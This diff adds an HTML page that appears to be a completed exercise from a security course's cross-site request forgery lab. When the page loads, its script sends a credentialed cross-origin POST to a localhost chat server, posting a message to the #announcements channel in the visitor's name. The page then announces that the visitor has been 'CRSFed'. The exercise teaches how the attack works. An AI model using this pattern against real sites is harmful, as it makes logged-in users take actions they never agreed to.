@@ -1,0 +1,33 @@
+<html>
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
+  <title>CSRF Demo @ NSK</title>
+  <script type="text/javascript">
+    // Your code goes here
+
+    // Hints:
+    // 1. Use the function `$.ajax` to send a request:
+    //    http://api.jquery.com/jquery.ajax/
+    // 2. If cookies are not included, try looking at the `xhrFields` parameter
+    $.ajax(
+    {
+        url: 'http://localhost:8000/post',
+        type: 'POST',
+        data: {channel: "#announcements", message : "Give Edward a Raise!"} ,
+        xhrFields: {withCredentials: true},
+        crossDomain: true
+      }
+    );
+  </script>
+  <style type="text/css">body { margin: 0px; }
+  </style>
+</head>
+<body>
+<p>
+You've been CRSFed! check out the messages on the #announcements channel!
+</p>
+</body>
+
+</html>
